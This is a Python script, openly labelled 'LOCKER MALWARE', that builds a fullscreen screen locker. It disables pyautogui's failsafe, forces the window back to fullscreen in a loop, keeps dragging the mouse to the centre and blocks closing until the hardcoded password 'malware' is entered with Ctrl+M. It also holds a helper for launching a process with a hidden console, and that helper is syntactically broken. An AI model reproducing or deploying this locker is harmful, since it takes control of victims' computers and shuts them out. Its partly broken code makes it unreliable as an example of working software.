from cProfile import label
from contextlib import closing
import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
import subprocess

def run_invisible_console("Path"):
    subprocess.Popen(["Path"], creationflags=0x08000000)

def callback(event):
    global key, entry
    if entry.get() == "malware":
        key = True

def on_closing():
    click(width/2, height/2)
    moveTo(width/2, height/2)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    root.bind('<Control-KeyPress-m>', callback)

root = Tk()
pyautogui.FAILSAFE = False
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.title('Locker')
root.attributes("-fullscreen", True)
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
label0x0 = Label(root, text="LOCKER MALWARE", font=1)
label0x0.grid(row=0, column=0)
label0x1 = Label(root, text="GUESS PASSWORD", font='Arial 22')
label0x1.place(x=width/2-75-130, y=height/2-25-100)
root.update()
sleep(0.1)
click(width/2, height/2)
key = False

while not key:
    on_closing()
